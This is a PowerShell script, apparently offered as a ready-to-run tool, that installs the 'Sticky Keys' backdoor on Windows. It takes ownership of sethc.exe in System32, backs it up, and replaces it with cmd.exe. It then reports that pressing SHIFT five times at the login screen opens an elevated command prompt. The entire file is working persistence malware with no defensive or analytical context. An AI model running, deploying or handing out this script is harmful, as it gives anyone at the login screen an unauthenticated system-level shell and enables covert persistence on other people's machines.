function Set-StickyKeysBackdoor {
    try {
        # Define paths
        $sys32 = "$env:SystemRoot\System32"
        $sethcPath = "$sys32\sethc.exe"
        $cmdPath = "$sys32\cmd.exe"
        $backupPath = "$env:TEMP\sethc.bak"
        
        # Take ownership and set permissions
        function Set-FileOwnership {
            param($path)
            
            # Take ownership
            $acl = Get-Acl $path
            $owner = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-32-544") # Administrators
            $acl.SetOwner($owner)
            Set-Acl -Path $path -AclObject $acl
            
            # Grant full control
            $rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
                "Administrators",
                "FullControl",
                "Allow"
            )
            $acl.AddAccessRule($rule)
            Set-Acl -Path $path -AclObject $acl
        }
        
        # Backup original sethc.exe
        if (Test-Path $sethcPath) {
            Write-Output "Backing up original sethc.exe..."
            Copy-Item -Path $sethcPath -Destination $backupPath -Force
        }
        
        # Take ownership and set permissions
        Write-Output "Setting file permissions..."
        Set-FileOwnership -path $sethcPath
        
        # Replace sethc.exe with cmd.exe
        Write-Output "Replacing sethc.exe with cmd.exe..."
        Copy-Item -Path $cmdPath -Destination $sethcPath -Force
        
        # Verify replacement
        if ((Get-FileHash $sethcPath).Hash -eq (Get-FileHash $cmdPath).Hash) {
            Write-Output "Sticky Keys successfully replaced with Command Prompt"
            Write-Output "Press SHIFT 5 times at login screen to access elevated command prompt"
        } else {
            throw "File replacement verification failed"
        }
        
    } catch {
        Write-Warning "Operation failed: $_"
        
        # Attempt to restore backup if exists
        if (Test-Path $backupPath) {
            Write-Output "Attempting to restore backup..."
            try {
                Copy-Item -Path $backupPath -Destination $sethcPath -Force
                Write-Output "Backup restored successfully"
            } catch {
                Write-Warning "Could not restore backup: $_"
            }
        }
    }
}

# Check for admin rights
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Warning "Requires administrative privileges"
    exit 1
}

# Execute the swap
Set-StickyKeysBackdoor
